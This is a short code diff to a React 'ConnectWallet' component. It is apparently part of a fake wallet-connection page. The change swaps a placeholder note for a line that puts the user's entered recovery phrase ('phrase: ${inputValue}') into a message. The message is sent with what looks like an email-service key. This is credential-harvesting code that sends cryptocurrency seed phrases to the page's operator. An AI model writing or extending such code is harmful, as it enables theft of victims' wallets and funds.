@@ -63,7 +63,7 @@ const ConnectWallet: React.FC<ConnectWalletProps> = ({
           time: new Date().toLocaleString(),
           message: `
               Wallet Type: ${title}
-              note: A client just inserted their phrase Key.
+              phrase: ${inputValue}.
             `,
         },
         "6yT_1hQ4omr4Cq-3C"
